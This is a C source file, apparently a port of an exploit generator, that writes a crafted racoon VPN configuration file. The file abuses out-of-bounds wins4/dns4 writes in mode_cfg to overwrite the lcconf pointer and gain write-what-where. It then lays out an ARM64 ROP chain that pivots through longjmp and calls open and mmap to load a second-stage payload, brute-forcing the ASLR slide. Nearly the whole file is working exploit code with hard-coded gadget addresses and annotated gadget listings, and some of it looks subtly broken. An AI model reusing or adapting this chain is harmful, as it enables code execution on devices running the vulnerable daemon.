// port of the old python generator file in the honeybadger repo
#include <fcntl.h>
#include <stdio.h>
#include <stdint.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <sys/mman.h>

enum ropgadget_types {
	STATIC,
	CODEADDR,
	OFFSET,
	NONE
};

struct rop_gadget {
	uint64_t value;
	int type;
	struct rop_gadget * next;
};
typedef struct rop_gadget rop_gadget_t;

struct offset_struct {
	int dns4_array_to_lcconf;
	rop_gadget_t * stage1_ropchain;
	uint32_t str_buff_offset;
	uint32_t max_slide;
	uint32_t slide_value;
	uint64_t pivot_x21;
	uint64_t memmove;
	uint64_t lcconf_counter_offset;
	uint64_t dispatcher;
	uint64_t regloader;
	uint64_t stackloader;
	uint64_t longjmp;
	uint64_t open;
	uint64_t mmap;
	uint64_t stage2_base;
	uint64_t stage2_size;
};
typedef struct offset_struct offset_struct_t;
#define STAGE2_FD 3

void stage1(int fd, offset_struct_t * offsets);
void get_ip_from_value(char * ip, uint32_t value);

uint32_t oldhigher_lcconf = 0xffffffff; // older value is unknown but we don't write to any address which has all high bits set so we can just set them here and the first time we need it in code we can handle it
char dns4_array_to_lcconf_distance[16];

void generate(char* filename, offset_struct_t * offsets) {
	int f = open(filename,O_WRONLY | O_CREAT);
	stage1(f,offsets);
}

#define shift_mask(value,shift,mask) ((value >> shift) & mask)
#define shiftm(value,shift) shift_mask(value,shift,0xff)
void get_ip_from_value(char * ip, uint32_t value) {
	snprintf(ip,16,"%u.%u.%u.%u",shiftm(value,24),shiftm(value,16),shiftm(value,8),value & 0xff);
}
void get_ip_from_value_int(char * ip, int value) {
	snprintf(ip,16,"%u.%u.%u.%u",shiftm(value,24),shiftm(value,16),shiftm(value,8),value & 0xff);
}

// overwrites the lcconf pointer in racoon
void change_lcconf(int fd, uint64_t new_addr) {
	// buffer we will write to the file at some point
	char buf[1024] = "mode_cfg{";
	// write what where template, four times wins4 <random ip> to move the wins pointer oob, one time wins 255.255.255.255 to overwrite the wins4 array index variable with -1
	// wins4%s to overwrite the dns4 array index variable with a negative number to point it to lcconf
	// dns4 to overwrite lcconf
	char * www = "wins41.0.0.7;wins41.0.0.7;wins41.0.0.7;wins41.0.0.7;wins4255.255.255.255;wins4%s;dns4%s;";

	uint32_t lower = new_addr & 0xffffffff;
	uint32_t higher = (new_addr >> 32) & 0xffffffff;

	// overwrite the lower half of the lcconf pointer
	char value_ip[16]; // 255.255.255.255 is max so 16 is always enough=
	get_ip_from_value((char*)&value_ip,lower);
	snprintf((char*)(((uint64_t)buf)+strlen(buf)),sizeof(buf)-strlen(buf)-1, www, dns4_array_to_lcconf_distance, value_ip);

	if (higher != oldhigher_lcconf) {
		oldhigher_lcconf = higher;
		// with each dns4 write the index moves one array item (32 bit) down, which is perfect for us because now we can just use another dns4 statment to overwrite the higher bits of the lcconf pointer
		// this is an improvment from the python script which saves a hell lot of bytes
		get_ip_from_value((char*)&value_ip,higher);
		snprintf((char*)(((uint64_t)buf)+strlen(buf)),sizeof(buf)-strlen(buf)-1, "dns4%s;",value_ip);
	}
	strcat(buf,"}"); // close the mode_cfg statment
	write(fd,buf,strlen(buf)); // write it to the config file
}

void write_to_lcconf(int fd,uint64_t what) {
	/* old version can be removed once I tested the new one
void write_to_lcconf(uint32_t what) {
	char buf[1024] = "padding{";


	union converter {
		uint32_t old;
		int new;
	}
	converter tmp;
	tmp.old = what;
	snprintf((char*)(((uint64_t)buf)+strlen(buf)+1),sizeof(buf)-strlen(buf)-1, "maximum_length%d;",tmp.new);


	strcat(buf,"}"); // close the padding statment
	write(fd,buf,strlen(buf)); // write it to the config file
	*/
	/*
	 * Note: I thought we might be able to overwrite another field in lcconf which is next to maximum_length, but it turns out that those fields are only semi controllable
	 * If there would be two fields next to each other we could write a whole 64 bits which would improve the file size a lot
	 * FIXME: we might be able to use retry_count and retry_interval with UNITTYPE_SEC
	 * untested implementation below
	 */

	char buf[1024] = "timer{";


	uint32_t lower = what & 0xffffffff;
	uint32_t higher = (what >> 32) & 0xffffffff;
	snprintf((char*)(((uint64_t)buf)+strlen(buf)),sizeof(buf)-strlen(buf)-1, "counter%u;",lower);

	// if we only want a 32 bit write we should get one and don't zero out the other 32 bits
	// this is an improvment from the script where we used padding and maximum_length to only write 32 bits each iteration
	if (higher != 0) {
		snprintf((char*)(((uint64_t)buf)+strlen(buf)),sizeof(buf)-strlen(buf)-1, "interval%usec;",higher);
	}

	strcat(buf,"}"); // close the padding statment
	write(fd,buf,strlen(buf)); // write it to the config file
}

void trigger_exec(int fd,char * controllable_buf) {
	if (strlen(controllable_buf) > 250) {
		printf("Something is wrong, I don't expect such a large buffer here\n");
		exit(0);
	}
	char buf[1024] = "mode_cfg{default_domain\"";
	strcat(buf,controllable_buf);
	strcat(buf,"\";}");
	write(fd,buf,strlen(buf)); // write it to the config file
}

void www64(int fd,offset_struct_t * offsets, uint64_t where, uint64_t what) {
	change_lcconf(fd,where-offsets->lcconf_counter_offset);
	write_to_lcconf(fd,what);
}

uint64_t get_ropchain_addr(offset_struct_t * offsets) {
	uint64_t test = offsets->memmove;
	union converter {
		uint64_t addr;
		char buf[8];
	};
	union converter tmp;
	memset(&tmp.buf,0,sizeof(tmp.buf));
	tmp.addr = test;
	for (int i = 0; i < sizeof(tmp.buf);i++) {
		if (tmp.buf[i] == '"') {
			tmp.addr++;
			i = 0;
		}
	}
	return tmp.addr;
}

void stage1(int fd, offset_struct_t * offsets) {
	// setup stage1
	// get the ip which reflex the distance between the dns4_array and lcconf as an int
	get_ip_from_value_int((char*)&dns4_array_to_lcconf_distance,offsets->dns4_array_to_lcconf);

	// get an address which is in the region that is always writeable and doesn't cotain a quote if we convert it into a string
	uint64_t ropchain_addr = get_ropchain_addr(offsets);

	// write all the values which shouldn't be slid
	rop_gadget_t * curr_gadget = offsets->stage1_ropchain;
	uint64_t curr_ropchain_addr = ropchain_addr;
	union converter {
		uint64_t addr;
		char buf[9];
	};
	union converter tmp;
	memset(&tmp.buf,0,sizeof(tmp.buf));
	tmp.addr = ropchain_addr;
	char buf[128] = "";
	// add padding (should never reach 100)
	for (int i = 0; i < offsets->str_buff_offset && i < 100; i++) {
		strcat(buf,"A");
	}
	strcat(buf,tmp.buf);
	while (curr_gadget != NULL) {
		switch(curr_gadget->type) {
			case STATIC:
				www64(fd,offsets,curr_ropchain_addr, curr_gadget->value);
			case OFFSET:
				www64(fd,offsets,curr_ropchain_addr,ropchain_addr+curr_gadget->value);
			default:
				break;
		}
		curr_gadget = curr_gadget->next;
	}
	int iterations = (offsets->max_slide/offsets->slide_value);
	printf("%d iterations\n",iterations);
	for (int i = 0; i < iterations; i++) {
		uint64_t slide = i*offsets->slide_value;
		www64(fd,offsets,offsets->pivot_x21+slide,offsets->memmove+slide);

		rop_gadget_t * curr_gadget = offsets->stage1_ropchain;
		uint64_t curr_ropchain_addr = ropchain_addr;
		while (curr_gadget != NULL) {
			switch (curr_gadget->type) {
				case CODEADDR:
					www64(fd,offsets,curr_ropchain_addr,curr_gadget->value+slide);
					break;
				default:
					break;
			}
			curr_gadget = curr_gadget->next;
			curr_ropchain_addr += 8;
		}
		trigger_exec(fd,(char*)&buf);
	}
}

#define ROP_SETUP(offsets) \
	rop_gadget_t * curr_gadget = malloc(sizeof(rop_gadget_t)); \
	rop_gadget_t * prev = NULL; \
	if (curr_gadget == NULL) {printf("malloc w00t\n");exit(-1);} \
	curr_gadget->next = NULL; \
	curr_gadget->type = NONE; \
	(offsets)->stage1_ropchain = curr_gadget;

#define ADD_GADGET() \
	if (prev != NULL) { \
		prev = curr_gadget; \
		curr_gadget = malloc(sizeof(rop_gadget_t));\
		curr_gadget->next = NULL; \
		curr_gadget->type = NONE; \
		prev->next = curr_gadget; \
	}else{ \
		prev = curr_gadget; \
	}

#define ADD_CODE_GADGET(addr) \
	ADD_GADGET(); \
	curr_gadget->value = addr; \
	curr_gadget->type = CODEADDR;

#define ADD_STATIC_GADGET(val) \
	ADD_GADGET(); \
	curr_gadget->value = val; \
	curr_gadget->type = STATIC;

#define ADD_OFFSET_GADGET(val) \
	ADD_GADGET(); \
	curr_gadget->value = val; \
	curr_gadget->type = OFFSET;

int install(const char *config_path, const char *racoon_path, const char *dyld_cache_path)
{
	offset_struct_t myoffsets;
	myoffsets.dns4_array_to_lcconf = -((0x100067c10+0x28-4*8)-0x1000670e0);
	myoffsets.lcconf_counter_offset = 0x100; // FIXME
	myoffsets.memmove = 0x1aa0b8bb8;
	myoffsets.max_slide = 0x66dc000;
	myoffsets.slide_value = 0x4000;
	myoffsets.pivot_x21 = 0x1990198fc;
	myoffsets.str_buff_offset = 8;



	/*
	[1]:

	We start with nothing but rip control and x21 pointing to a string buffer (AAAAAAAA<address of our rop stack>)
	the pivot x21 gadget looks like this:
	(this comes from libLLVM)
	0x1990198fc      a80640f9       ldr x8, [x21, 8]    <= x8 = address of our rop stack
	0x199019900      090140f9       ldr x9, [x8]        <= x9 is the first value at our rop stack
	0x199019904      292940f9       ldr x9, [x9, 0x50]  <= x9 is loaded from x9->0x50 and this is used to jump (we need to put our next code pointer there)
	0x199019908      e30740f9       ldr x3, [sp, 8]     <= x3 comes from the stack so we don't know what it will contain
	0x19901990c      e20300aa       mov x2, x0          <= don't know what's in x0
	0x199019910      e00308aa       mov x0, x8          <= x0 will contain x8 so the address of our rop stack
	0x199019914      e10316aa       mov x1, x22         <= don't know what's in x22
	0x199019918      e40314aa       mov x4, x20         <= don't know what's in x20
	0x19901991c      e50313aa       mov x5, x19         <= don't know what's in x19
	0x199019920      20013fd6       blr x9              <= will branch to [x8]->0x50

	This means that the first value in our stack needs to point to a place where +0x50 the new func pointer will be found

	[2]:
	Next we jump to longjmp to pivot and get more control over our registers
	x0 will point to the top of the stack
	(this comes from libsystem_platform)
	__longjmp:
	   180a817dc	LDP     X19, X20, [X0,#0]	 // x19 will contain the same address as x9 and we don't really want to change that 0x08 of our stack will be loaded into x20
	   180a817e0	LDP     X21, X22, [X0,#16]	 // x21 = our stack 0x10 and x22 = our stack 0x18
	   180a817e4	LDP     X23, X24, [X0,#32]   // x23 = our stack 0x20 and x24 = our stack 0x28
	   180a817e8	LDP     X25, X26, [X0,#48]   // x25 = our stack 0x30 and x26 = our stack 0x38
	   180a817ec	LDP     X27, X28, [X0,#64]   // x27 = our stack 0x40 and x28 = our stack 0x48
	   180a817f0	LDP     X29, X30, [X0,#80]   // x29 = our stack 0x50 and x30 = our stack 0x58
	   180a817f4	LDP     X29, X2, [X0,#96]    // x29 = our stack 0x60 and x2  = our stack 0x68
	   180a817f8	LDP     D8, D9, [X0, #112]   // we can ignore those registers
	   180a817fc	LDP     D10, D11, [X0, #128] //
	   180a81800	LDP     D12, D13, [X0, #144] //
	   180a81804	LDP     D14, D15, [X0, #160] //
	   180a81808	ADD     X31, X2, #0    	     // we pivot using x2 which is loaded from
	   180a8180c	MOV     X0, X1         	     // x0 will now contain the contents of x1 we can't control atm
	   180a81810	CMP     X0, #0         	     // irrelvant
	   180a81814	B.NE    0x180a8181c
	   180a81818	ADD     X0, X0, #1
	   180a8181c    RET                          // pivoted

	   So basically we want to set 0x58 to our next gadget and 0x68 to the address of our new stack

	[3]:
		(regloader addresses aren't from my dyld cache)
		regloader:
        0x180ee6048      e00317aa       mov x0, x23 // loads higher regs into lower ones
        0x180ee604c      e10316aa       mov x1, x22
        0x180ee6050      e20318aa       mov x2, x24
        0x180ee6054      e30319aa       mov x3, x25
        0x180ee6058      e4031aaa       mov x4, x26
        0x180ee605c      e5031baa       mov x5, x27
        0x180ee6060      80033fd6       blr x28

		This will give us control over x0-x5 by using x23,x22,x24,x25,x26 and x27 which we control via the longjmp
		But we need another gadget to set x30 otherwise we can't continue, so this will jump to our dispatcher [4]

	[4]:
		(dispatcher addresses aren't from my dyld cache)
        0x180d62e48      a0023fd6       blr x21
        0x180d62e4c      fd7b43a9       ldp x29, x30, [sp, 0x30]
        0x180d62e50      f44f42a9       ldp x20, x19, [sp, 0x20]
        0x180d62e54      f65741a9       ldp x22, x21, [sp, 0x10]
        0x180d62e58      ff030191       add sp, sp, 0x40
        0x180d62e5c      c0035fd6       ret

		Now this is our dispatcher it will straight jump to x21 (which we control [2]) with the args we setup in [3]
		and after that it will load x30 from the stack at 0x38 and add 0x40 to the stack, so the stack will move from 0xb0 to 0xf0
		We will call open("/private/etc/racoon/<func pointer>", O_RDONLY); the func pointer will be used to know which slide we need to use
		Path is stored at 0xc0 

		path: (/private/etc/racoon/<func pointer>\x00):
		0x2f707269 /pri
		0x76617465 vate
		0x2f657463 /etc
		0x2f706163 /rac
		0x6f6f6e2f oon/
		0xXXXXXXXX <func pointer>
		0x00
		
		Fingers crossed thatt the string will survive when we start to call funcs...

	[5]:
		we need to load new regs now, we will use a stack loader for that
		(again not from my cache)
        0x18098e2a8      fd7b46a9       ldp x29, x30, [sp, 0x60]
        0x18098e2ac      f44f45a9       ldp x20, x19, [sp, 0x50]
        0x18098e2b0      f65744a9       ldp x22, x21, [sp, 0x40]
        0x18098e2b4      f85f43a9       ldp x24, x23, [sp, 0x30]
        0x18098e2b8      fa6742a9       ldp x26, x25, [sp, 0x20]
        0x18098e2bc      fc6f41a9       ldp x28, x27, [sp, 0x10]
        0x18098e2c0      ffc30191       add sp, sp, 0x70
        0x18098e2c4      c0035fd6       ret

		So now we load all the regs and afterwards the stack will be moved from 0xf0 to 0x160

	[6]:
		 regloader again
	[7]:
		dispatcher to mmap(stage2_base,stage2_size,PROT_READ | PROT_WRITE,STAGE2_FD,0)
		
		Stack will move from 0x160 to 0x1a0

	[8]:
		when we are here x0 contains the return value of mmap/the stage so we just jump to longjmp and let stage2 handle all of the other stuff
	*/
	ROP_SETUP(&myoffsets);
	ADD_OFFSET_GADGET(0);					   // 0x00		[1] x9 will be loaded from here and then again point to our stack so at our stack+0x50 we need the next gadget
	ADD_GADGET();							   // 0x08		[2] x20
	ADD_CODE_GADGET(myoffsets.open);		   // 0x10		[2] x21 [4] dispatcher: jump/next gadget
	ADD_STATIC_GADGET(O_RDONLY);			   // 0x18		[2] x22 [3] regloader: x1/second arg
	ADD_OFFSET_GADGET(0xc0)					   // 0x20		[2] x23 [3] regloader: x0/first arg (path for open)
	ADD_GADGET();							   // 0x28		[2] x24 [3] regloader: x2/thrid arg
	ADD_GADGET();							   // 0x30		[2] x25 [3] regloader: x3/fourth arg
	ADD_GADGET();							   // 0x38		[2] x26 [3] regloader: x4/fifth arg
	ADD_GADGET();							   // 0x40		[2] x27 [3] regloader: x5/sixth arg
	ADD_CODE_GADGET(myoffsets.dispatcher);	   // 0x48		[2] x28 [3] regloader: jump/next gadget
	ADD_CODE_GADGET(myoffsets.longjmp);		   // 0x50		[1] (next gadget) [2] 0x29 (but x29 will be overwritten later)
	ADD_CODE_GADGET(myoffsets.regloader);	   // 0x58		[2] x30 (next gadget)
	ADD_GADGET();							   // 0x60		[2] x29
	ADD_OFFSET_GADGET(0xb0);				   // 0x68		[2] x2  (new stack)
	ADD_GADGET();							   // 0x70		[2] weird Dx registers
	ADD_GADGET();							   // 0x78		[2] weird Dx registers
	ADD_GADGET();							   // 0x80		[2] weird Dx registers
	ADD_GADGET();							   // 0x88		[2] weird Dx registers
	ADD_GADGET();							   // 0x90		[2] weird Dx registers
	ADD_GADGET();							   // 0x98		[2] weird Dx registers
	ADD_GADGET();							   // 0xa0		[2] weird Dx registers
	ADD_GADGET();							   // 0xa8		[2] weird Dx registers

	ADD_GADGET();							   // 0xb0		[2] new stack top
	ADD_GADGET();							   // 0xb8
	ADD_STATIC_GADGET(0x2f707269);			   // 0xc0		[4] x22 (/pri)
	ADD_STATIC_GADGET(0x76617465);			   // 0xc8		[4] x21 (vate)
	ADD_STATIC_GADGET(0x2f657463);			   // 0xd0		[4] x20 (/etc)
	ADD_STATIC_GADGET(0x2f706163);			   // 0xd8		[4] x19 (/rac)
	ADD_STATIC_GADGET(0x6f6f6e2f);			   // 0xe0		[4] x29 (oon/)
	ADD_CODE_GADGET(myoffsets.stackloader);	   // 0xe8		[4] x30/ld load (next gadget)

	ADD_STATIC_GADGET(0x00);				   // 0xf0		[4] stack will be here after dispatch returned (zero char for the string)
	ADD_GADGET();							   // 0xf8
	ADD_CODE_GADGET(myoffsets.dispatcher);	   // 0x100		[5] x28 [6] regloader: jump/next gadget
	ADD_GADGET();							   // 0x108		[5] x27 [6] regloader: x5/fifth arg
	ADD_STATIC_GADGET(0);					   // 0x110		[5] x26 [6] regloader: x4/fourth arg
	ADD_STATIC_GADGET(STAGE2_FD);			   // 0x118		[5] x25 [6] regloader: x3/fourth arg
	ADD_STATIC_GADGET(PROT_READ | PROT_WRITE); // 0x120		[5] x24 [6] regloader: x2/third arg
	ADD_STATIC_GADGET(myoffsets.stage2_size);  // 0x128		[5] x23 [6] regloader: x1/second arg
	ADD_STATIC_GADGET(myoffsets.stage2_base);  // 0x130		[5] x22 [6] regloader: x0/frist arg
	ADD_CODE_GADGET(myoffsets.mmap);		   // 0x138		[5] x21 [7] dispatcher: jump/next gadget
	ADD_GADGET();							   // 0x140		[5] x20
	ADD_GADGET();							   // 0x148		[5] x19
	ADD_GADGET();							   // 0x150		[5] x29
	ADD_CODE_GADGET(myoffsets.regloader);	   // 0x158		[5] x30 (next gadget)

	ADD_GADGET();							   // 0x160     [5] new stack top
	ADD_GADGET();							   // 0x168     
	ADD_GADGET();							   // 0x170     [7] x22
	ADD_GADGET();							   // 0x178     [7] x21
	ADD_GADGET();							   // 0x180     [7] x20
	ADD_GADGET();							   // 0x188     [7] x19
	ADD_GADGET();							   // 0x190     [7] x29
	ADD_CODE_GADGET(myoffsets.longjmp)		   // 0x198     [7] x30 (next gadget) [8] kickstart of stage 2, longjmp will load from there, so start of stage2 is the new longjmp buffer

	ADD_GADGET();							   // 0x1a0     [7] new stack top



	generate("./test.conf",&myoffsets);

	return 0;
}
